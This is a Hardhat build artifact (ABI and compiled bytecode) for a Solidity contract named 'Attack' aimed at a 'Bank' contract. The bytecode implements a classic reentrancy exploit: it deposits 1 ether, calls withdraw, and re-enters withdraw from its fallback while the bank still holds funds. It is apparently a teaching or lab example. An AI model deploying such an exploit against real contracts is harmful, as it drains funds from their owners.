{
  "_format": "hh-sol-artifact-1",
  "contractName": "Attack",
  "sourceName": "contracts/Attack.sol",
  "abi": [
    {
      "inputs": [
        {
          "internalType": "address",
          "name": "_depositFundsAddress",
          "type": "address"
        }
      ],
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "stateMutability": "payable",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "depositFunds",
      "outputs": [
        {
          "internalType": "contract Bank",
          "name": "",
          "type": "address"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    },
    {
      "inputs": [],
      "name": "getBalance",
      "outputs": [
        {
          "internalType": "uint256",
          "name": "",
          "type": "uint256"
        }
      ],
      "stateMutability": "view",
      "type": "function"
    }
  ],
  "bytecode": "0x60806040523480156200001157600080fd5b50604051620009f4380380620009f48339818101604052810190620000379190620002b8565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550620000c26040518060400160405280601581526020017f6465706f7369742066756e647320616464726573730000000000000000000000815250620000df60201b620002ae1760201c565b620000d8816200018260201b620003471760201c565b50620003e0565b6200017f81604051602401620000f691906200038e565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506200022560201b60201c565b50565b6200022281604051602401620001999190620003c3565b6040516020818303038152906040527f2c2ecbc2000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506200022560201b60201c565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000620002808262000253565b9050919050565b620002928162000273565b81146200029e57600080fd5b50565b600081519050620002b28162000287565b92915050565b600060208284031215620002d157620002d06200024e565b5b6000620002e184828501620002a1565b91505092915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156200032657808201518184015260208101905062000309565b8381111562000336576000848401525b50505050565b6000601f19601f8301169050919050565b60006200035a82620002ea565b620003668185620002f5565b93506200037881856020860162000306565b62000383816200033c565b840191505092915050565b60006020820190508181036000830152620003aa81846200034d565b905092915050565b620003bd8162000273565b82525050565b6000602082019050620003da6000830184620003b2565b92915050565b61060480620003f06000396000f3fe6080604052600436106100385760003560e01c806312065fe0146101025780639e5faafc1461012d578063e2c41dbc1461013757610039565b5b670de0b6b3a764000060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1631106101005760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b1580156100e757600080fd5b505af11580156100fb573d6000803e3d6000fd5b505050505b005b34801561010e57600080fd5b50610117610162565b6040516101249190610422565b60405180910390f35b61013561016a565b005b34801561014357600080fd5b5061014c61028a565b60405161015991906104bc565b60405180910390f35b600047905090565b670de0b6b3a764000034101561017f57600080fd5b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663d0e30db0670de0b6b3a76400006040518263ffffffff1660e01b81526004016000604051808303818588803b1580156101ef57600080fd5b505af1158015610203573d6000803e3d6000fd5b505050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561027057600080fd5b505af1158015610284573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b610344816040516024016102c29190610570565b6040516020818303038152906040527f41304fac000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506103e0565b50565b6103dd8160405160240161035b91906105b3565b6040516020818303038152906040527f2c2ecbc2000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff83818316178352505050506103e0565b50565b60008151905060006a636f6e736f6c652e6c6f679050602083016000808483855afa5050505050565b6000819050919050565b61041c81610409565b82525050565b60006020820190506104376000830184610413565b92915050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600061048261047d6104788461043d565b61045d565b61043d565b9050919050565b600061049482610467565b9050919050565b60006104a682610489565b9050919050565b6104b68161049b565b82525050565b60006020820190506104d160008301846104ad565b92915050565b600081519050919050565b600082825260208201905092915050565b60005b838110156105115780820151818401526020810190506104f6565b83811115610520576000848401525b50505050565b6000601f19601f8301169050919050565b6000610542826104d7565b61054c81856104e2565b935061055c8185602086016104f3565b61056581610526565b840191505092915050565b6000602082019050818103600083015261058a8184610537565b905092915050565b600061059d8261043d565b9050919050565b6105ad81610592565b82525050565b60006020820190506105c860008301846105a4565b9291505056fea26469706673582212209ebb438b0857ae38697dfb433cdc0b4b7c300fc7f6e5a3af4c5cdb59f0309a9e64736f6c63430008090033",
  "linkReferences": {},
  "deployedLinkReferences": {}
}